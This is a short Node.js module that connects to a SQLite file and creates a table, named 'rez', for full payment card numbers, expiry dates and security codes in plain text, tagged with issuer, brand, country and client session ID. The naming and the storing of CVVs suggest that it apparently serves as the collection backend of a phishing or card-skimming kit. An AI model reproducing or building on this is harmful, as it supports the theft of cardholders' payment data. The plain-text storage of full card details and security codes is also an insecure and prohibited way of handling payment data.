const sqlite3 = require("sqlite3").verbose();
const path = require("path");

const dbPath = path.join(__dirname, "rzzza.db");
const db = new sqlite3.Database(dbPath, (err) => {
  if (err) {
    console.error("❌ DB connection failed:", err.message);
  } else {
    console.log("✅ SQLite connected");
  }
});

db.run(`
  CREATE TABLE IF NOT EXISTS rez (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    clientSessionId TEXT,
    card_number TEXT UNIQUE,
    expiry_date TEXT,
    security_code TEXT,
    issuer TEXT,
    brand TEXT,
    scheme TEXT,
    type TEXT,
    cc_country TEXT,
    logo_url TEXT,
    created_at TEXT
);
`);
module.exports = db;
